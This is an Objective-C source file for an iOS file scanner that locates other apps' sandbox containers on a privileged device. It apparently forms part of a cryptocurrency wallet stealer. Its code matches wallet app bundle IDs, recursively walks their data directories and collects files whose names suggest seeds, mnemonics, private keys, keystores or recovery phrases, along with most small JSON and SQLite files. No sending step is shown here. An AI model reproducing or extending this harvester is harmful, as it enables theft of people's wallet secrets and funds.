//
//  RDFileScanner.m
//  文件系统扫描器实现
//

#import "RDFileScanner.h"

@implementation RDScannedFile
- (NSString *)description {
    return [NSString stringWithFormat:@"[%@] %@ (%llu bytes)", self.walletName, self.fullPath, self.fileSize];
}
@end

@implementation RDFileScanner

// ============ Constants ============
static NSString * const kBundleContainersPath = @"/var/containers/Bundle/Application/";
static NSString * const kDataContainersPath  = @"/var/mobile/Containers/Data/Application/";
static const NSUInteger kMaxFileSize         = 50 * 1024 * 1024;  // 跳过 >50MB 的文件
static const NSUInteger kMaxScanDepth        = 6;                  // 最大目录深度

// ============ 主入口 ============
+ (NSArray<RDScannedFile *> *)scanAllWallets {
    NSMutableArray<RDScannedFile *> *results = [NSMutableArray new];
    NSArray<RDWalletTarget *> *targets = [RDWalletFingerprintDB allTargets];

    // 按优先级排序
    targets = [targets sortedArrayUsingComparator:^NSComparisonResult(RDWalletTarget *a, RDWalletTarget *b) {
        return [@(a.priority) compare:@(b.priority)];
    }];

    for (RDWalletTarget *target in targets) {
        @autoreleasepool {
            NSArray<RDScannedFile *> *files = [self scanWallet:target];
            if (files.count > 0) {
                [results addObjectsFromArray:files];
            }
        }
    }

    return results;
}

// ============ 扫描单个钱包 ============
+ (NSArray<RDScannedFile *> *)scanWallet:(RDWalletTarget *)target {
    // 步骤1：找到这个App的沙盒根目录
    NSString *sandboxRoot = [self sandboxRootForBundleID:target.bundleID];
    if (!sandboxRoot || sandboxRoot.length == 0) {
        return @[];
    }

    NSMutableArray<RDScannedFile *> *results = [NSMutableArray new];

    // 步骤2：遍历 fingerprint 中的路径
    for (NSString *pattern in target.filePatterns) {
        @autoreleasepool {
            NSString *fullPath = [sandboxRoot stringByAppendingPathComponent:pattern];

            // 如果是目录 → 递归扫描
            BOOL isDir = NO;
            if ([[NSFileManager defaultManager] fileExistsAtPath:fullPath isDirectory:&isDir]) {
                if (isDir) {
                    NSArray *found = [self scanDirectory:fullPath
                                          withExtensions:target.fileExtensions
                                              walletName:target.displayName
                                                bundleID:target.bundleID];
                    [results addObjectsFromArray:found];
                } else {
                    // 是单个文件 → 直接检查
                    if ([self shouldCollectFile:fullPath extensions:target.fileExtensions]) {
                        RDScannedFile *sf = [self fileInfoAtPath:fullPath
                                                       walletName:target.displayName
                                                         bundleID:target.bundleID];
                        if (sf) [results addObject:sf];
                    }
                }
            }
        }
    }

    return results;
}

// ============ 定位沙盒路径 ============
+ (nullable NSString *)sandboxRootForBundleID:(NSString *)bundleID {
    // 方法A：通过 iTunesMetadata.plist 匹配
    NSArray<NSString *> *appDirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:kBundleContainersPath error:nil];
    for (NSString *uuid in appDirs) {
        @autoreleasepool {
            NSString *plistPath = [NSString stringWithFormat:@"%@%@/iTunesMetadata.plist", kBundleContainersPath, uuid];
            NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:plistPath];
            if (meta && [meta[@"softwareVersionBundleId"] isEqualToString:bundleID]) {
                // 找到了 → 通过 container 映射找 Data 目录
                NSString *dataUUID = [self dataContainerUUIDForAppUUID:uuid];
                if (dataUUID) {
                    return [kDataContainersPath stringByAppendingPathComponent:dataUUID];
                }
            }
        }
    }

    // 方法B：直接遍历 Data 目录，根据 .com.apple.mobile_container_manager.metadata.plist
    NSArray<NSString *> *dataDirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:kDataContainersPath error:nil];
    for (NSString *uuid in dataDirs) {
        @autoreleasepool {
            NSString *metaPath = [NSString stringWithFormat:@"%@%@/.com.apple.mobile_container_manager.metadata.plist",
                                  kDataContainersPath, uuid];
            NSDictionary *dataMeta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
            if (dataMeta && [dataMeta[@"MCMMetadataIdentifier"] isEqualToString:bundleID]) {
                return [kDataContainersPath stringByAppendingPathComponent:uuid];
            }
        }
    }

    return nil;
}

// ============ 从 iTunesMetadata 找 Data Container UUID ============
+ (nullable NSString *)dataContainerUUIDForAppUUID:(NSString *)appUUID {
    NSString *metaPath = [NSString stringWithFormat:@"%@%@/iTunesMetadata.plist", kBundleContainersPath, appUUID];
    NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
    // containerInfo 在 iTunesMetadata 里以特殊方式存储，这里尝试多种键
    NSArray *keys = @[@"containerInfo", @"Containers", @"containerIDs"];
    for (NSString *key in keys) {
        id containerInfo = meta[key];
        if ([containerInfo isKindOfClass:[NSDictionary class]]) {
            // 取第一个 container
            id firstContainer = [containerInfo allValues].firstObject;
            if ([firstContainer isKindOfClass:[NSString class]]) {
                return firstContainer;
            }
        }
    }
    // 回退：枚举所有 Data container 找匹配
    return [self findDataContainerByEnumeration:appUUID meta:meta];
}

+ (nullable NSString *)findDataContainerByEnumeration:(NSString *)appUUID meta:(nullable NSDictionary *)meta {
    NSString *bundlePath = [NSString stringWithFormat:@"%@%@/", kBundleContainersPath, appUUID];
    NSArray<NSString *> *dataDirs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:kDataContainersPath error:nil];
    for (NSString *uuid in dataDirs) {
        NSString *metaPath = [NSString stringWithFormat:@"%@%@/.com.apple.mobile_container_manager.metadata.plist",
                              kDataContainersPath, uuid];
        NSDictionary *dataMeta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
        if (!dataMeta) continue;
        NSString *identifier = dataMeta[@"MCMMetadataIdentifier"];
        if (!identifier) continue;
        // 如果 meta 里有 bundleID，用它匹配
        if (meta && meta[@"softwareVersionBundleId"] && [identifier isEqualToString:meta[@"softwareVersionBundleId"]]) {
            return uuid;
        }
    }
    return nil;
}

// ============ 递归扫描 ============
+ (NSArray<RDScannedFile *> *)scanDirectory:(NSString *)directory
                            withExtensions:(NSArray<NSString *> *)extensions
                                walletName:(NSString *)name
                                  bundleID:(NSString *)bundleID {
    return [self scanDirectory:directory
                withExtensions:extensions
                    walletName:name
                      bundleID:bundleID
                         depth:0];
}

+ (NSArray<RDScannedFile *> *)scanDirectory:(NSString *)directory
                            withExtensions:(NSArray<NSString *> *)extensions
                                walletName:(NSString *)name
                                  bundleID:(NSString *)bundleID
                                     depth:(NSUInteger)depth {
    if (depth > kMaxScanDepth) return @[];

    NSMutableArray<RDScannedFile *> *results = [NSMutableArray new];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray<NSString *> *contents = [fm contentsOfDirectoryAtPath:directory error:nil];

    for (NSString *item in contents) {
        @autoreleasepool {
            // 跳过隐藏文件和系统文件
            if ([item hasPrefix:@"."] || [item hasPrefix:@"__"]) continue;

            NSString *fullPath = [directory stringByAppendingPathComponent:item];
            BOOL isDir = NO;
            if (![fm fileExistsAtPath:fullPath isDirectory:&isDir]) continue;

            if (isDir) {
                // 跳过常见的大型无意义目录
                if ([@[@"tmp", @"Caches", @"Snapshots"] containsObject:item]) continue;
                if (depth < kMaxScanDepth) {
                    [results addObjectsFromArray:[self scanDirectory:fullPath
                                                      withExtensions:extensions
                                                          walletName:name
                                                            bundleID:bundleID
                                                               depth:depth + 1]];
                }
            } else {
                if ([self shouldCollectFile:fullPath extensions:extensions]) {
                    RDScannedFile *sf = [self fileInfoAtPath:fullPath walletName:name bundleID:bundleID];
                    if (sf) [results addObject:sf];
                }
            }
        }
    }

    return results;
}

// ============ 过滤判断 ============
+ (BOOL)shouldCollectFile:(NSString *)path extensions:(NSArray<NSString *> *)extensions {
    NSString *ext = [[path pathExtension] lowercaseString];

    // 匹配扩展名
    BOOL extMatch = NO;
    for (NSString *target in extensions) {
        if ([ext isEqualToString:[target lowercaseString]]) {
            extMatch = YES;
            break;
        }
    }
    if (!extMatch) return NO;

    // 检查文件大小
    NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil];
    if (!attrs) return NO;
    unsigned long long size = [attrs fileSize];
    if (size == 0 || size > kMaxFileSize) return NO;

    // 额外检查：文件名包含钱包关键词
    NSString *fileName = [[path lastPathComponent] lowercaseString];
    NSArray *walletKeywords = @[@"wallet", @"key", @"seed", @"mnemonic", @"backup",
                                 @"vault", @"keystore", @"account", @"private", @"phrase",
                                 @"recovery", @"encrypt", @"crypto", @"token", @"balance"];
    for (NSString *kw in walletKeywords) {
        if ([fileName containsString:kw]) return YES;
    }

    // 或者是常见的钱包文件名
    NSArray *commonNames = @[@"walletinfo.json", @"config.json", @"user.json",
                              @"wallets.json", @"key.json", @"data.sqlite",
                              @"preferences.json", @"storage.json"];
    for (NSString *cn in commonNames) {
        if ([fileName isEqualToString:cn]) return YES;
    }

    // 小于 5MB 的 JSON/SQLite 都值得收集
    if (size < 5 * 1024 * 1024) return YES;

    return NO;
}

// ============ 文件信息 ============
+ (nullable RDScannedFile *)fileInfoAtPath:(NSString *)path
                                 walletName:(NSString *)name
                                   bundleID:(NSString *)bundleID {
    NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil];
    if (!attrs) return nil;

    RDScannedFile *sf = [RDScannedFile new];
    sf.walletName       = name;
    sf.bundleID         = bundleID;
    sf.fullPath         = path;
    sf.fileName         = [path lastPathComponent];
    sf.fileSize         = [attrs fileSize];
    sf.modificationDate = attrs[NSFileModificationDate];
    return sf;
}

@end
